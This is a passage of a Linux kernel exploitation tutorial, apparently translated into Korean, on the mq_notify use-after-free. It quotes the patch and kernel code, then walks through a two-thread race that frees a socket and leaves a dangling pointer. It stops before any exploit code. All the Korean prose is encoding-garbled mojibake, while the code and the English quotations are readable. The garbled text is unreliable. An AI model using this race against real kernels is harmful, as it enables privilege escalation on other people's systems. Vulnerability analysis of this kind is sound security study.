"smart pointer"(í˜¹ì€ operator overloadê°™ì€ ê²ƒ)ì™€ ê°™ì€ ê²ƒì´ ì¡´ì¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ ë‹¤ë£¨ëŠ” ê²ƒì€ ê°œë°œìì— ì˜í•´ *ìˆ˜ë™ìœ¼ë¡œ*  ì´ë¤„ì§„ë‹¤. ì´ëŠ” ì–´ë–¤ ì˜¤ë¸Œì íŠ¸ê°€ ë‹¤ë¥¸ ì˜¤ë¸Œì íŠ¸ì— ì˜í•´ ì°¸ì¡°ë  ë•Œ, ì°¸ì¡°ëœ ì˜¤ë¸Œì íŠ¸ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ëŠ” ë¬´ì¡°ê±´ *ëª…ì‹œì ìœ¼ë¡œ*(explicitly) ì¦ê°€í•´ì•¼ í•œë‹¤ëŠ” ê²ƒì´ë‹¤. ì°¸ì¡°ê°€ ëë‚˜ë©´ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ëŠ” ë¬´ì¡°ê±´ *ëª…ì‹œì ìœ¼ë¡œ*  ê°ì†Œí•´ì•¼ í•œë‹¤. ì˜¤ë¸Œì íŠ¸ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ 0ì´ ë˜ë©´ í•´ì œëœë‹¤.

**ë…¸íŠ¸**: ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ ì¦ê°€ì‹œí‚¤ëŠ” ê²ƒì„ "ì°¸ì¡°í•œë‹¤"(taking a reference)ë¼ê³  í•œë‹¤. ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ ê°ì†Œì‹œí‚¤ëŠ” ê²ƒì€ "ì°¸ì¡°ë¥¼ ë²„ë¦°ë‹¤/í•´ì œí•œë‹¤"(dropping/releasing)ë¼ê³  í•œë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡  ë¶ˆê· í˜•ì´ ìˆì–´ì„œ(ì˜ˆ: ì°¸ì¡°ë¥¼ í•œ ë²ˆ í•˜ê³  ë‘ ë²ˆ í•´ì œí•˜ëŠ” ê²ƒ) ì–¸ì œë“  memory corruptionì˜ ìœ„í—˜ì´ ìˆë‹¤"

* ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ ë‘ ë²ˆ ê°ì†Œí•œë‹¤: *use-after-free*
* ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ ë‘ ë²ˆ ì¦ê°€í•œë‹¤: *use-after-free* ë¡œ ì´ì–´ì§€ëŠ” memory leak í˜¹ì€ *int-overflow*

ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì€ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ ë‹¤ë£¨ê¸° ìœ„í•´ ì¼ë°˜ì ì¸ ì¸í„°í˜ì´ìŠ¤(common interface)ë¡œ ë˜ì–´ ìˆëŠ” ì—¬ëŸ¬ ì‹œì„¤(facilities)ì„ ê°€ì§€ê³  ìˆë‹¤(*kref,kobject*). ê·¸ëŸ¬ë‚˜ ì´ê²ƒì´ ì‹œìŠ¤í…œì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ê²ƒì€ ì•„ë‹ˆê³  ìš°ë¦¬ê°€ ì—¬ê¸°ì„œ ë‹¤ë£° ì˜¤ë¸Œì íŠ¸ëŠ” ê°ìì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ ê´€ë¦¬í•´ì£¼ëŠ” helperê°€ ìˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ì°¸ì¡°ëŠ” **"\*\_get()"** ê³¼ ê°™ì€ í•¨ìˆ˜ì—ì„œ ì´ë¤„ì§€ê³ , ì°¸ì¡° í•´ì œëŠ” **"\*\_put()"**ê³¼ ê°™ì€ í•¨ìˆ˜ì—ì„œ ì´ë¤„ì§„ë‹¤.

ìš°ë¦¬ì˜ ê²½ìš°, ê°ê°ì˜ ì˜¤ë¸Œì íŠ¸ëŠ” ê°ê¸° ë‹¤ë¥¸ ì´ë¦„ì˜ helperë¥¼ ê°€ì§„ë‹¤:

* **struct\_sock**: sock\_hold(), sock\_put()
* **struct file**: fget(), fput()
* **struct files\_struct**: get\_files\_struct(), put\_files\_struct()
* ...

**ì£¼ì˜**: ë” í˜¼ë€ìŠ¤ëŸ¬ì›Œì§ˆ ìˆ˜ ìˆë‹¤! ì˜ˆë¥¼ ë“¤ì–´ **skb\_put()**ì€ ì–´ë–¤ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë„ ê°ì†Œì‹œí‚¤ì§€ ì•Šê³  ê·¸ì € ë°ì´í„°ë¥¼ sk ë²„í¼ë¡œ "ë„£ëŠ”ë‹¤"(push). ì ˆëŒ€ í•¨ìˆ˜ì˜ ì´ë¦„ë§Œì„ ë³´ê³  ê·¸ í•¨ìˆ˜ì˜ ê¸°ëŠ¥ì„ ì¶”ì •í•˜ì§€ ë§ì. í™•ì¸ì„ í•´ì•¼ í•œë‹¤.

ì´ì œ ë²„ê·¸ë¥¼ ì´í•´í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ëª¨ë“  ë°ì´í„° êµ¬ì¡°ë¥¼ ì†Œê°œí–ˆë‹¤. ì´ì œ ë‹¤ìŒìœ¼ë¡œ ë„˜ì–´ê°€ì„œ CVEë¥¼ ë¶„ì„í•´ë³´ì.

---

## <a name='public-information'></a>ê³µê°œëœ ì •ë³´

ë²„ê·¸ë¥¼ íŒŒê³ ë“¤ê¸° ì „ì— **mq\_notify()** syscallì˜ ì£¼ ëª©ì ë¶€í„° ì§šê³  ë„˜ì–´ê°€ì. "mq\_\*"ëŠ” "POSIX message queues"ë¥¼ ì˜ë¯¸í•˜ë©° legacy System V message queuesë¥¼ ëŒ€ì²´í•œë‹¤:

```plaintext
POSIX message queues allow processes to exchange data in the form of messages.
This API is distinct from that provided by System V message  queues (msgget(2),
msgsnd(2), msgrcv(2), etc.), but provides similar functionality.
```

*mq\_notify()*  syscall ìì²´ëŠ” ë¹„ë™ê¸°ì  ì•Œë¦¼(asynchronous notifications)ì„ ë“±ë¡/ë“±ë¡ ì·¨ì†Œí•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤.

```plaintext
mq_notify() allows the calling process to register or unregister for delivery of an
asynchronous notification when a new message arrives on the empty message queue
referred to by the descriptor mqdes.
```

CVE ì—°êµ¬ë¥¼ ì‹œì‘í•  ë•ŒëŠ” descriptionê³¼ ê·¸ CVEë¥¼ ê³ ì¹˜ëŠ” íŒ¨ì¹˜ë¥¼ ë³´ëŠ” ê²ƒì´ ì¢‹ì€ ë°©ë²•ì´ë‹¤.

*The **mq\_notify** function in the Linux kernel through 4.11.9 does not set **the sock pointer** to NULL upon entry into the **retry** logic. During a user-space close of a **Netlink socket**, it allows attackers to cause a denial of service (**use-after-free**) or possibly have unspecified other impact (ring-0 take over?).*

íŒ¨ì¹˜ëŠ” [ì—¬ê¸°](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f991af3daabaecff34684fd51fac80319d1baad1)ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

```bash
diff --git a/ipc/mqueue.c b/ipc/mqueue.c
index c9ff943..eb1391b 100644
--- a/ipc/mqueue.c
+++ b/ipc/mqueue.c
@@ -1270,8 +1270,10 @@ retry:

      timeo = MAX_SCHEDULE_TIMEOUT;
      ret = netlink_attachskb(sock, nc, &timeo, NULL);
-     if (ret == 1)
+     if (ret == 1) {
+       sock = NULL;
        goto retry;
+     }
      if (ret) {
        sock = NULL;
        nc = NULL;
```

ì¶©ë¶„íˆ ì‰¬ì›Œë³´ì´ëŠ” *í•œ ì¤„ì§œë¦¬ íŒ¨ì¹˜*ë‹¤!

ë§ˆì§€ë§‰ìœ¼ë¡œ íŒ¨ì¹˜ ì„¤ëª…ì„ ë³´ë©´ ë²„ê·¸ë¥¼ ì´í•´í•˜ëŠ” ë° ì•„ì£¼ ë„ì›€ì´ ë˜ëŠ” ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤:

```plaintext
mqueue: fix a use-after-free in sys_mq_notify()
The retry logic for netlink_attachskb() inside sys_mq_notify()
is nasty and vulnerable:

1) The sock refcnt is already released when retry is needed
2) The fd is controllable by user-space because we already
   release the file refcnt

so we then retry but the fd has been just closed by user-space
during this small window, we end up calling netlink_detachskb()
on the error path which releases the sock again, later when
the user-space closes this socket a use-after-free could be
triggered.

Setting 'sock' to NULL here should be sufficient to fix it
```

íŒ¨ì¹˜ ì„¤ëª…ì—” **ë‹¨ í•˜ë‚˜ì˜ ì‹¤ìˆ˜**ë§Œì´ ì¡´ì¬í•œë‹¤: *during this small window*. "racy"í•œ ê´€ì ì—ì„œì˜ ë²„ê·¸ì§€ë§Œ, ì´ ì‘ì€ ê¸°íšŒê°€ ê²°ì •ì ì¸ ë°©ì‹ìœ¼ë¡œ ë¬´í•œì • ì»¤ì§ˆ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ë³´ê²Œ ë  ê²ƒì´ë‹¤([part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196) ì°¸ê³ ).

---

## <a name='understanding-the-bug'></a>ë²„ê·¸ ì´í•´í•˜ê¸°

ìœ„ì˜ íŒ¨ì¹˜ ì„¤ëª…ì€ ìœ ìš©í•œ ì •ë³´ë¥¼ ë§ì´ ì£¼ì—ˆë‹¤:

* ì·¨ì•½í•œ ì½”ë“œëŠ” **mq\_notify** syscallì— ìˆë‹¤.
* **retry logic**ì— ì˜ëª»ëœ ê²ƒì´ ìˆë‹¤.
* **sock variable refcounting**ì— use-after-freeë¡œ ì´ì–´ì§€ëŠ” ì˜ëª»ëœ ê²ƒì´ ìˆë‹¤.
* *closed fd* ì™€ í•¨ê»˜ **race condition**ì— ê´€ë ¨ëœ ë¬´ì–¸ê°€ê°€ ìˆë‹¤.

### The Vulnerable code

*mq\_notify* syscallì´ ì–´ë–»ê²Œ êµ¬í˜„ë˜ì—ˆëŠ”ì§€ íŒŒí—¤ì³ë³´ì. íŠ¹íˆ **retry logic**(= *retry* label)ê³¼ **exit path**(i.e. *out* label)ë¥¼ ì¤‘ì ì ìœ¼ë¡œ ë³´ì.

```c
      // from [ipc/mqueue.c]

      SYSCALL_DEFINE2(mq_notify, mqd_t, mqdes,
          const struct sigevent __user *, u_notification)
      {
        int ret;
        struct file *filp;
        struct sock *sock;
        struct sigevent notification;
        struct sk_buff *nc;

        // ... cut (copy userland data to kernel + skb allocation) ...

        sock = NULL;
    retry:
[0]       filp = fget(notification.sigev_signo);
          if (!filp) {
            ret = -EBADF;
[1]         goto out;
          }
[2a]      sock = netlink_getsockbyfilp(filp);
[2b]      fput(filp);
          if (IS_ERR(sock)) {
            ret = PTR_ERR(sock);
            sock = NULL;
[3]         goto out;
          }

          timeo = MAX_SCHEDULE_TIMEOUT;
[4]       ret = netlink_attachskb(sock, nc, &timeo, NULL);
          if (ret == 1)
[5a]        goto retry;
          if (ret) {
            sock = NULL;
            nc = NULL;
[5b]        goto out;
          }

[5c]    // ... cut (normal path) ...

      out:
        if (sock) {
          netlink_detachskb(sock, nc);
        } else if (nc) {
          dev_kfree_skb(nc);
        }
        return ret;
      }
```

ìœ„ì˜ ì½”ë“œì˜ ì‹œì‘ì€ ìœ ì €ì—ê²Œì„œ ì œê³µëœ file descriptorë¥¼ ê°€ì§€ê³  *struct file* ì˜¤ë¸Œì íŠ¸ë¥¼ ì°¸ì¡°í•˜ëŠ” ê²ƒì´ë‹¤ [0]. ë§Œì•½ ì´ëŸ¬í•œ fdê°€ í˜„ì¬ í”„ë¡œì„¸ìŠ¤ì˜ **file descriptor table (fdt)**ì— ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´ NULL í¬ì¸í„°ê°€ ë°˜í™˜ë˜ê³  ì½”ë“œëŠ” *exit path* ë¡œ ê°„ë‹¤ [1].

ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ê·¸ fileê³¼ ì—°ê´€ëœ *struct sock* ì˜¤ë¸Œì íŠ¸ê°€ ì°¸ì¡°ëœë‹¤ [2a]. ì—°ê´€ëœ ìœ íš¨í•œ *struct sock*  ì˜¤ë¸Œì íŠ¸ê°€ ì—†ìœ¼ë©´(ì¡´ì¬í•˜ì§€ ì•Šê±°ë‚˜ bad typeì¼ ê²½ìš°) *sock* ì— ëŒ€í•œ í¬ì¸í„°ëŠ” NULLë¡œ ì¬ì„¤ì •ë˜ê³  ì½”ë“œëŠ” exit pathë¡œ í˜ëŸ¬ê°„ë‹¤ [3]. ë‘ ê²½ìš° ëª¨ë‘ *struct file*  ì— ëŒ€í•œ ì°¸ì¡°ê°€ í•´ì œëœë‹¤ [2b].

ë§ˆì§€ë§‰ìœ¼ë¡œ *struct sk\_buff* (nc)ë¥¼ *struct sock*  receive queueì— enqueueí•˜ëŠ” **netlink\_attachskb()**ì— ëŒ€í•œ í˜¸ì¶œì´ ìˆë‹¤ [4]. ê·¸ ë¶€ë¶„ì—ì„  ì„¸ ê°€ì§€ ê²°ê³¼ê°€ ë‚˜ì˜¬ ìˆ˜ ìˆë‹¤:

1. ëª¨ë“  ê²Œ ì˜ ëŒì•„ê°€ì„œ ì½”ë“œê°€ normal pathë¡œ ì´ì–´ì§„ë‹¤ [5c].
2. í•¨ìˆ˜ê°€ 1ì„ ë°˜í™˜í•œë‹¤. ì´ ê²½ìš° ì½”ë“œëŠ” **retry label** [5a]ë¡œ ëŒì•„ê°„ë‹¤. ì¦‰ "retry logic"ì´ë‹¤.
3. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ *nc* ì™€ *sock*  ëª¨ë‘ NULLì´ ë˜ì–´ ì½”ë“œê°€ *exit path* ë¡œ í˜ëŸ¬ê°„ë‹¤ [5b].

### Why setting "sock" to NULL matters?

ì´ ì§ˆë¬¸ì— ë‹µí•˜ê¸° ìœ„í•´, NULLì´ *ì•„ë‹ˆë¼ë©´* ì–´ë–¤ ì¼ì´ ì¼ì–´ë‚ ì§€ ìƒê°í•´ë³´ì. ê·¸ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:

```c
  out:
    if (sock) {
      netlink_detachskb(sock, nc);  // <----- here
    }
```
```c
    // from [net/netlink/af_netlink.c]

    void netlink_detachskb(struct sock *sk, struct sk_buff *skb)
    {
      kfree_skb(skb);
      sock_put(sk);       // <----- here
    }
```
```c
    // from [include/net/sock.h]

    /* Ungrab socket and destroy it if it was the last reference. */
    static inline void sock_put(struct sock *sk)
    {
      if (atomic_dec_and_test(&sk->sk_refcnt))    // <----- here
        sk_free(sk);
    }
```

ë‹¤ì‹œ ë§í•´, *sock* ì´ *exit path*ì—ì„œ *NULL*ì´ ì•„ë‹ˆë¼ë©´, ***sock*ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„° (*sk\_refcnt*)ê°€ ë¬´ì¡°ê±´ 1 ë‚´ë ¤ê°€ëŠ” ê²ƒì´ë‹¤

patchê°€ ì‹œì‘ë˜ë©´ *sock* ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´íŒ…ì„ í•˜ëŠ” ë° ë¬¸ì œê°€ ìˆë‹¤. ì´ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´íŠ¸ê°€ ì²˜ìŒìœ¼ë¡œ ì¦ê°€í•˜ëŠ” ê²ƒì€ ì–´ë””ì¸ê°€? **netlink\_getsockbyflip()** ì½”ë“œë¥¼ ë³´ë©´ (ì´ì „ ë¦¬ìŠ¤íŠ¸ì˜ [2a]ì—ì„œ í˜¸ì¶œë¨) ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì„ ë³¼ ìˆ˜ ìˆë‹¤:

```c
    // from [net/netlink/af_netlink.c]

    struct sock *netlink_getsockbyfilp(struct file *filp)
    {
      struct inode *inode = filp->f_path.dentry->d_inode;
      struct sock *sock;

      if (!S_ISSOCK(inode->i_mode))
        return ERR_PTR(-ENOTSOCK);

      sock = SOCKET_I(inode)->sk;
      if (sock->sk_family != AF_NETLINK)
        return ERR_PTR(-EINVAL);

[0]   sock_hold(sock);    // <----- here
      return sock;
    }
```

```c
    // from [include/net/sock.h]

    static inline void sock_hold(struct sock *sk)
    {
      atomic_inc(&sk->sk_refcnt);   // <------ here
    }
```

*sock*  ì˜¤ë¸Œì íŠ¸ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ëŠ” retry logicì˜ êµ‰ì¥íˆ ì•ìª½ì—ì„œ ì¦ê°€í•œë‹¤ [0].

ì¹´ìš´í„°ê°€ *netlink\_getsockbyflip()* ì— ì˜í•´ ë¬´ì¡°ê±´ ì¦ê°€í•˜ê³  *netlink\_detachskb()* ì— ì˜í•´ ë¬´ì¡°ê±´ ê°ì†Œí•˜ëŠ”ë° (*sock*ì´ NULLì´ ì•„ë‹ˆë¼ë©´), ì´ëŠ”  *netlink\_attachskb()* ê°€ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ì™€ ê´€ë ¨í•˜ì—¬(regarding) ì¤‘ë¦½ì ì´ì–´ì•¼ í•¨ì„ ì˜ë¯¸í•œë‹¤.

ë‹¤ìŒì€ *netlink\_attachskb()*  ì½”ë“œë¥¼ ê°„ë‹¨í•˜ê²Œ ë§Œë“  ê²ƒì´ë‹¤:

```c
    // from [net/netlink/af_netlink.c]

    /*
     * Attach a skb to a netlink socket.
     * The caller must hold a reference to the destination socket. On error, the
     * reference is dropped. The skb is not sent to the destination, just all
     * all error checks are performed and memory in the queue is reserved.
     * Return values:
     * < 0: error. skb freed, reference to sock dropped.
     * 0: continue
     * 1: repeat lookup - reference dropped while waiting for socket memory.
     */

    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;

      nlk = nlk_sk(sk);

      if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {

        // ... cut (wait until some conditions) ...

        sock_put(sk);         // <----- refcnt decremented here

        if (signal_pending(current)) {
          kfree_skb(skb);
          return sock_intr_errno(*timeo); // <----- "error" path
        }
        return 1;   // <----- "retry" path
      }
      skb_set_owner_r(skb, sk);   // <----- "normal" path
      return 0;
    }
```

netlink\_attachskb() í•¨ìˆ˜ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë‘ ê²½ë¡œê°€ ìˆë‹¤:

1. ì¼ë°˜ì ì¸ ê²½ë¡œ: *skb* ì˜ ì†Œìœ ê¶Œ(ownership)ì´ *sock* ìœ¼ë¡œ ì´ì „ëœë‹¤(= sock receive queueì— ë“¤ì–´ê°„ë‹¤).
2. ì†Œì¼“ì˜ receive bufferê°€ ê½‰ ì°¼ì„ ë•Œ: ì¶©ë¶„í•œ ê³µê°„(room)ì´ ìƒê¸¸ ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ê³  ì¬ì‹œë„(retry)í•˜ê±°ë‚˜ ì˜¤ë¥˜ë¡œ ì¢…ë£Œëœë‹¤.

*top-commentary* ì—ì„  ì´ë ‡ê²Œ ë§í•œë‹¤: *í˜¸ì¶œì(caller) ê°€ ëª©ì ì§€ì¸ ì†Œì¼“ì— ëŒ€í•œ ì°¸ì¡°ë¥¼ ê°€ì§€ê³  ìˆì–´ì•¼ í•œë‹¤. ì—ëŸ¬ê°€ ë°œìƒí•˜ë©´, **ì°¸ì¡°ê°€ í•´ì œëœë‹¤**.* *netlink\_attachskb()* ëŠ” sock ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´íŒ…ì— ë¶€ì‘ìš©ì´ ìˆëŠ” ê²ƒì´ë‹¤!

*netlink\_attachskb()* ê°€ ì°¸ì¡°ë¥¼ í•´ì œí•˜ê¸° ë•Œë¬¸ì— (*netlink\_getsockbyflip()*ì— ì˜í•´ì„œëŠ” í•˜ë‚˜ë§Œ ì˜¬ë¼ê°„ë‹¤), **ë‘ ë²ˆì§¸ì— ì°¸ì¡°ë¥¼ í•´ì œí•˜ì§€ ì•ŠëŠ” ê²ƒ**ì€ í˜¸ì¶œìì—ê²Œ ì±…ì„ì´ ìˆë‹¤. ì´ëŠ” *sock* ì„ NULLë¡œ ì„¤ì •í•˜ë©´ ë˜ëŠ”ë°, "error" path(netlink\_attachskb()ëŠ” ìŒì˜ ê°’ì„ ë°˜í™˜í•œë‹¤)ì—ì„œëŠ” ì ì ˆíˆ ì´ë¤„ì§€ì§€ë§Œ "retry" ê²½ë¡œì—ì„  (*netlink\_attachskb()*ê°€ 1ì„ ë°˜í™˜í•œë‹¤) ê·¸ë ‡ì§€ ëª»í•˜ë‹¤. ì´ê²ƒì´ íŒ¨ì¹˜ ë‚´ìš©ì˜ ì „ë¶€ë‹¤.

ì´ì œ *sock*  ë³€ìˆ˜ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´íŒ…ê³¼(íŠ¹ì • ì¡°ê±´ì—ì„œ ë‘ ë²ˆ í•´ì œë¨) retry logicì—(*sock* ì„ NULLë¡œ ë¦¬ì…‹í•˜ì§€ ì•ŠìŒ) ì–´ë–¤ ë¬¸ì œê°€ ìˆëŠ”ì§€ ì•Œê²Œ ë˜ì—ˆë‹¤.

### What about the "race condition"?

íŒ¨ì¹˜ëŠ” "closed fd"ì™€ ì—°ê´€ëœ "ì‘ì€ ê¸°íšŒ"(=race condition)ì— ëŒ€í•´ ì–¸ê¸‰í–ˆë‹¤. ì™œì¼ê¹Œ?

*retry path* ì˜ ì œì¼ ì²« ë¶€ë¶„ì„ ë‹¤ì‹œ ë³´ì:

```c
    sock = NULL;  // <----- first loop only
    retry:
          filp = fget(notification.sigev_signo);
          if (!filp) {
            ret = -EBADF;
            goto out;         // <----- what about this?
          }
          sock = netlink_getsockbyfilp(filp);
```

ì´ *ì—ëŸ¬ ì²˜ë¦¬*  ê²½ë¡œëŠ” *ì²« ë£¨í”„*ì—ì„  ë¬¸ì œ ì—†ì–´ ë³´ì¸ë‹¤. ê·¸ëŸ¬ë‚˜ *ë‘ ë²ˆì§¸ ë£¨í”„*ì—ì„  ***sock* ì´ ë”ì´ìƒ NULLì´ ë˜ì§€ ì•ŠëŠ”ë‹¤**(ì°¸ì¡°ëŠ” ì´ë¯¸ í•´ì œë˜ì–´ ìˆë‹¤). ë”°ë¼ì„œ ë°”ë¡œ "out"ìœ¼ë¡œ ì í”„í•˜ê²Œ ë˜ê³  ì²« ë²ˆì§¸ ì¡°ê±´ì„ ë§Œì¡±í•œë‹¤(hits the first condition).

```c
    out:
      if (sock) {
        netlink_detachskb(sock, nc);
      }
```

*sock* ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ ë‘ ë²ˆ ì¤„ì–´ë“œëŠ” ê²ƒì´ë‹¤! **ì´ê²ƒì´ ì´ì¤‘ *sock\_put()* ë²„ê·¸ì´ë‹¤**.

ì™œ ì²« ë²ˆì§¸ ë£¨í”„ì—ì„  ë§Œì¡±í•˜ì§€ ì•Šë˜ ì¡°ê±´ì„(*fget()* ì´ NULLì„ ë°˜í™˜) ë‘ ë²ˆì§¸ ë£¨í”„ì—ì„œ ë§Œì¡±í• ê¹Œ?(?) ì´ê²ƒì´ ë²„ê·¸ì˜ **race condition**ì ì¸ ì¸¡ë©´ì´ë‹¤. ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ì–´ë–»ê²Œ í•˜ëŠ”ì§€ ë³´ê²Œ ë  ê²ƒì´ë‹¤.

### Attack Scenario

file descriptor tableì´ ë‘ ìŠ¤ë ˆë“œ ì‚¬ì´ì— ê³µìœ ë  ìˆ˜ ìˆë‹¤ê³  ê°€ì •í•˜ê³ , ë‹¤ìŒ sequenceë¥¼ ê³ ë ¤í•´ë³´ì.

```plaintext
Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
                                    |                       |             |             |                    |
  fget(<TARGET_FD>) -> ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -> ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(<TARGET_FD>) -> ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -> returns 1  |                       | 1           | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(<TARGET_FD>)    | 0 (-1)      | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(<TARGET_FD) -> returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -> UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
```

**close(TARGET\_FD)** syscallì€ *fput()* (*struct file* ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ í•˜ë‚˜ ë‚®ì¶”ëŠ”)ì„ í˜¸ì¶œí•˜ê³  ì£¼ì–´ì§„ file descriptor(TARGET\_FD)ì—ì„œ ì°¸ì¡°ëœ fileë¡œì˜ ë§¤í•‘ì„ ì—†ì•¤ë‹¤. ì¦‰ *fdt[TARGET\_FD]* í•­ëª©ì„ NULLë¡œ ì„¤ì •í•˜ëŠ” ê²ƒì´ë‹¤. **close(TARGET\_FD)**ë¥¼ í˜¸ì¶œí•˜ë©´ ì—°ê´€ëœ *struct file* ì— ëŒ€í•œ ì œì¼ ìµœê·¼ì˜ ì°¸ì¡°ê°€ í•´ì œë˜ë¯€ë¡œ, *struct file*ì€ freeë  ê²ƒì´ë‹¤.

*struct file* ì´ freeë˜ë©´ ì—°ê´€ëœ *struct sock* ì— ëŒ€í•œ ì°¸ì¡°ê°€ í•´ì œëœë‹¤(= ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ 1 ê°ì†Œí•œë‹¤). ìœ„ì™€ ë˜‘ê°™ì´ *sock* ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë„ 0ì´ ë˜ë¯€ë¡œ freeëœë‹¤. ì´ ì‹œì ì— *sock* í¬ì¸í„°ëŠ” NULLë¡œ ë¦¬ì…‹ë˜ì§€ ì•Šì€ *dangling pointer*ì´ë‹¤.

*fget()* ì— ëŒ€í•œ ë‘ ë²ˆì§¸ í˜¸ì¶œì€ (fdê°€ FDTì— ìˆëŠ” ì–´ëŠ ìœ íš¨í•œ struct fileë„ ê°€ë¦¬í‚¤ì§€ ì•Šê¸° ë•Œë¬¸ì—) ì‹¤íŒ¨í•  ê²ƒì´ê³  ë°”ë¡œ "out" labelë¡œ ì í”„í•  ê²ƒì´ë‹¤. ê·¸ëŸ¬ë©´ *netlink\_detachskb()* ê°€ freeëœ ë°ì´í„°ì— ëŒ€í•œ í¬ì¸í„°ì™€ í•¨ê»˜ í˜¸ì¶œë  ê²ƒì´ê³ , ì´ëŠ” **use-after-free**ì˜ ì›ì¸ì´ ëœë‹¤!

ë‹¤ì‹œ ë§í•˜ì§€ë§Œ use-after-freeëŠ” ê²°ê³¼ì´ì§€ ë²„ê·¸ê°€ ì•„ë‹ˆë‹¤.

ê·¸ë¦¬ê³  ì´ ì ì´ ë°”ë¡œ íŒ¨ì¹˜ì—ì„œ "closed fd"ê°€ ì–¸ê¸‰ëœ ì´ìœ ì´ë‹¤. **ì‹¤ì œë¡œ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ì„œ ì´ ì¡°ê±´ì´ ê¼­ í•„ìš”í•˜ë‹¤**. ê·¸ë¦¬ê³  *close()* ê°€ ë‹¤ë¥¸ ìŠ¤ë ˆë“œì—ì„œ ë§¤ìš° êµ¬ì²´ì ì¸ íƒ€ì´ë°ì—ë§Œ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— ì´ê²ƒì„ "race"ë¼ê³  í•œë‹¤.

ë‹¤ì‹œ ë§í•´, ìš°ë¦¬ê°€ *mq\_notify* syscallì´ ëë‚˜ê³  ëŒì•„ì˜¤ë©´ *sock*ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ 1 ê°ì†Œí•˜ê³  ìš°ë¦¬ëŠ” ë¶ˆê· í˜•ì„ ë§Œë“¤ì–´ë‚¸ ê²ƒì´ë‹¤. *mq\_notify()* ì— ì§„ì…í•˜ê¸° ì „ì— *sock*ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ 1ë¡œ ì„¤ì •ë˜ì–´ ìˆì—ˆê¸° ë•Œë¬¸ì— syscall(*netlink\_detachskb()* ë‚´ë¶€ì—ì„œ)ì— ë§ˆì§€ë§‰ì—” freeëœ í›„ ì‚¬ìš©ëœë‹¤.

- - -

## <a name='reaching-the-retry-logic'></a>Retry Logic ë„ë‹¬í•˜ê¸°

